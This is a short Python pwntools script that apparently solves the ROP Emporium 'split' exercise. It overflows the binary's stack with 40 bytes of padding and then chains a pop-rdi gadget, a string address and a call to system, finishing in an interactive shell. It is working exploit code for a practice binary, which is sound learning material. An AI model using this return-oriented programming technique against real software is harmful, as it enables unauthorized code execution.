from pwn import *


binary = ELF('./split')

p = binary.process()

# usefulFunction = p64(0x0400742)
system = p64(0x00000000040074b)
pop_rdi = p64(0x00000000004007c3)
usefulString = p64(0x0601060)

offset = 40

payload = b'A' * 40 + pop_rdi + usefulString + system

with open("payload", "wb") as f:
    f.write(payload)

p.sendline(payload)

p.interactive()

